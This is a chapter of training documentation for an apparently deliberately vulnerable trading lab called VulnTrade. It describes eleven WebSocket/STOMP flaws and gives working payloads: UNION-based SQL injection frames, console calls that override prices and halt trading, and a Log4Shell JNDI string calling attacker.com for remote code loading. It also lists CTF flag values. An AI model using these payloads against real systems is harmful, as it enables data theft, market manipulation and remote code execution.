# 05 — WebSocket & STOMP Vulnerabilities

## Overview
VulnTrade uses STOMP-over-WebSocket for real-time trading. This is a genuinely underserved area in security training — WAFs don't inspect WebSocket frames, automated scanners have limited WS support, and most pentesters have never practiced SQL injection over STOMP. This section covers the full WebSocket attack surface.

---

## Architecture

```
Browser (STOMP.js client)
    │
    │  ws://host:8085/ws
    │  STOMP CONNECT frame with Authorization header
    │
    ├── SUBSCRIBE /topic/prices         (broadcast price feed)
    ├── SUBSCRIBE /topic/admin/alerts   (admin-only... or is it?)
    ├── SUBSCRIBE /user/queue/orders    (personal order updates)
    ├── SUBSCRIBE /user/queue/history   (trade history response)
    │
    ├── SEND /app/trade.placeOrder      (place orders)
    ├── SEND /app/trade.getHistory      (fetch history — SQLi!)
    ├── SEND /app/admin.setPrice        (price manipulation!)
    └── SEND /app/admin.adjustBalance   (balance manipulation!)
```

---

## Vulnerabilities

### WS-01: SQL Injection via STOMP (Trade History)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | STOMP `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:25-45`, `TradeStompController.java:326-375` |

**Description:** Three injectable parameters (`startDate`, `endDate`, `symbol`) are concatenated into raw SQL (no binding). The successful response is sent back via `/user/queue/history`; when the injected SQL fails to parse, the handler relays the raw exception as an `ERROR` on `/user/queue/errors`, leaking the database/parser error — a working error-based oracle. The SELECT list has **5 columns** (`t.id, t.symbol, t.quantity, t.price, t.executed_at`), so a UNION payload must supply 5 columns to extract cleanly.

**Why WAFs miss this:** WebSocket frames use binary framing after the HTTP upgrade handshake. STOMP message bodies (JSON) are inside WebSocket frames. Most WAFs only inspect HTTP request/response.

**How to exploit (Browser UI):**
1. Navigate to History page
2. In Symbol field: `' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --`
3. Click "Load via WebSocket"

**How to exploit (CLI with wscat):**
```bash
wscat -c ws://localhost:8085/ws
# CONNECT frame, then:
SEND
destination:/app/trade.getHistory
content-type:application/json

{"startDate":"2020-01-01","endDate":"2030-12-31","symbol":"' UNION SELECT 1,flag_value,3,4,now() FROM flags --"}
^@
```

See [../websocket-sqli-guide.md](../websocket-sqli-guide.md) for comprehensive payloads.

---

### WS-02: Admin Price Override — No Authorization
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Difficulty | Intermediate |
| Endpoint | STOMP `/app/admin.setPrice` |
| File | `AdminStompController.java:137-156`, `StompChannelInterceptor.java:142-158` |

**Description:** The `setPrice` handler has NO role check. Any authenticated user can set any symbol to any price. The `StompChannelInterceptor` logs a `websocket_authorization_failed` warning for non-admin senders of `/app/admin.*` but **does not block** the message. Proven: a `TRADER` moved GME from ~28 to 13371 and the change was visible via REST `GET /api/market/prices/GME`.

**How to exploit:**
```javascript
// In browser console (WebSocket already connected):
sendMessage('/app/admin.setPrice', { symbol: 'VULN', price: 99999 });
```

---

### WS-03: Admin Balance Adjustment — No Authorization
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Difficulty | Intermediate |
| Endpoint | STOMP `/app/admin.adjustBalance` |
| File | `AdminStompController.java:48-78` |

**Description:** Same as WS-02 — `adjustBalance` only *logs* a warning for a non-admin role, then processes the request anyway (lines 51-57). Any user can adjust any user's balance by `userId`. Give yourself unlimited money or drain other accounts. Proven: a freshly-registered non-admin credited its own account over STOMP and the change showed up in `GET /api/accounts/balance`.

---

### WS-04: Admin Channel Subscribable by All Users
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Difficulty | Intermediate |
| Endpoint | STOMP `SUBSCRIBE /topic/admin/alerts` |
| File | `StompChannelInterceptor.java:125-140` |

**Description:** Any authenticated user can subscribe to admin broadcast channels. The interceptor only logs a `websocket_authorization_failed` event for a non-admin SUBSCRIBE to `/topic/admin/*`; it never blocks it. These channels leak admin actions, balance adjustments, and trading-halt notifications — the halt alert even carries `FLAG{st0mp_4dm1n_ch4nn3l_l34k}` (Flag 7). Proven: a `TRADER` received a `TRADING_HALT` broadcast with the flag attached.

---

### WS-05: Anonymous WebSocket Connection Allowed
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A07: Identification and Authentication Failures |
| CWE | CWE-306 |
| Difficulty | Intermediate |
| File | `StompChannelInterceptor.java:107-114` |

**Description:** If no JWT is provided in the STOMP CONNECT frame, the connection is allowed with an "anonymous" principal (lines 107-114; it logs `websocket_authentication_failed` but still connects). Anonymous users can subscribe to broadcast topics like `/topic/prices`. Proven: a CONNECT with no token still receives a `CONNECTED` frame.

---

### WS-06: Token in STOMP Headers (Visible in Network Tab)
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A07: Identification and Authentication Failures |
| CWE | CWE-522 |
| File | `websocketService.js:23`, `StompChannelInterceptor.java:54-90` |

**Description:** The JWT token is sent as a plain STOMP header (`Authorization` / `token`) in the CONNECT frame. It's visible in browser DevTools > Network > WS tab to anyone with access to the browser, and it is actually honoured — an authenticated `getBalance` returns the real username, not `anonymous`. The handshake also accepts the token as a `?token=` **query parameter** (captured by `WebSocketAuthInterceptor` and picked up at `StompChannelInterceptor.java:95-105`), so the credential can leak into access logs / history exactly like DATA-06.

---

### WS-07: No WebSocket Origin Validation
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A01: Broken Access Control |
| CWE | CWE-346 |
| File | `WebSocketConfig.java:39-40` (and `:44-47` for the SockJS endpoint) |

**Description:** `setAllowedOriginPatterns("*")` permits WebSocket connections from any origin. A malicious page on any domain can establish a WebSocket connection to VulnTrade if the user has a valid session. Proven: a raw handshake with `Origin: https://evil.com` still receives a `CONNECTED` frame.

---

### WS-08: No Message Rate Limiting
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A04: Insecure Design |
| CWE | CWE-799 |
| File | `WebSocketConfig.java:49` |

**Description:** No limit on STOMP messages per second. An attacker can flood the server with order placement requests, price override commands, or history queries.

---

### WS-09: Message Size Limit — Claim Debunked (Config No-Op)
| Field | Value |
|-------|-------|
| Status | ⚠️ Not exploitable as written — effective size limit present; the 10 MB config is a no-op bug |
| OWASP | A04: Insecure Design |
| CWE | CWE-400 |
| File | `WebSocketConfig.java:53-59` |

**Description:** The original claim ("no message size limit → DoS via oversized payloads") does **not** reproduce. `configureWebSocketTransport` calls `setMessageSizeLimit(10 * 1024 * 1024)` (line 56), but that value never takes effect: the underlying servlet WebSocket text buffer (~16–32 KB) wins, so an oversized frame **drops the connection** instead of being processed. A ~8 KB frame is accepted; a ~1 MB frame is rejected.

So there *is* an effective size limit — the "10 MB / unbounded" framing is false. The real issue is a **misconfiguration / bug**: the 10 MB `setMessageSizeLimit` is silently overridden and does nothing (the comment in the file claiming "no message size limit configured" is itself wrong). If the config were ever made effective, the documented DoS would become real.

---

### WS-10: Trading Halt Bypass
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Endpoint | STOMP `/app/admin.haltTrading`, `/app/admin.resumeTrading` |
| File | `AdminStompController.java:84-130`, `StompChannelInterceptor.java:142-158` |

**Description:** The real issue is **missing authorization**, not an order-accumulation trick: any non-admin can halt and resume trading for any symbol (the `/app/admin.*` role check only logs, never blocks). This is a denial-of-service / market-control primitive — an attacker can freeze a symbol at will. Proven: a `TRADER` received `TRADING_HALTED` and `TRADING_RESUMED` replies.

> Note: the old "accumulate orders during a halt, then resume to execute" path no longer works — the halt check in `OrderService.placeOrder` applies to **all** order types, so new orders are rejected while a symbol is halted.

---

### WS-11: Log4Shell (CVE-2021-44228) via STOMP Messages
| Field | Value |
|-------|-------|
| Severity | Critical (CVSS 10.0) |
| OWASP | A03: Injection + A06: Vulnerable Components |
| CWE | CWE-917 |
| CVE | CVE-2021-44228 |
| Difficulty | Advanced |
| Endpoints | `/app/admin.haltTrading` (reason), `/app/admin.adjustBalance` (reason), `/app/trade.setAlert` (symbol) |
| Files | `AdminService.java:97,73`, `AlertService.java:53` |

**Description:** The backend uses Log4j2 2.14.1 and logs user-controlled input from STOMP messages without sanitization. Injecting `${jndi:ldap://attacker/Exploit}` in the `reason` field of halt/balance operations triggers JNDI lookup resolution → remote class loading → RCE.

**Why WebSocket makes this worse:** WAFs inspect HTTP traffic but cannot see inside STOMP frames. Log4Shell payloads delivered via WebSocket bypass every network-level defense.

**Quickest trigger:**
```javascript
sendMessage('/app/admin.haltTrading', {
  symbol: 'AAPL',
  reason: '${jndi:ldap://attacker.com:1389/Exploit}'
});
```

**Flag:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` — read `/opt/flags/flag_log4shell.txt` after achieving RCE.

See [03-injection.md#inj-11](03-injection.md#inj-11-log4shell-cve-2021-44228-via-websocket) for the full exploitation walkthrough with marshalsec setup.
